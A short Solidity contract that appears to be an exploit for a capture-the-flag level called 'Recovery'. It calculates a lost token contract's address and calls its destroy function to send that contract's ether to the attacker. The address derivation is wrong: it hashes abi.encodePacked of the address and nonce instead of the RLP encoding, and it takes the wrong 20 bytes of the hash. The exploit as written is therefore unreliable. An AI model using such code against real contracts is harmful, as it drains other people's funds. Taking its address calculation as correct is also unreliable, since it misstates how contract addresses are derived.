pragma solidity ^0.8.0;

interface ISimpleToken {
    function destroy(address payable _to) external;
}


contract RecoveryExploitFinal {
    address public recoveryInstance;

    constructor(address _recoveryInstance) {
        recoveryInstance = _recoveryInstance;
    }

    function calculateTokenAddress() public view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(recoveryInstance, 1));
        return address(uint160(bytes20(hash)));
    }

    function attack() public {
        ISimpleToken token = ISimpleToken(calculateTokenAddress());
        token.destroy(payable(address(this)));
    }

    receive() external payable {} }
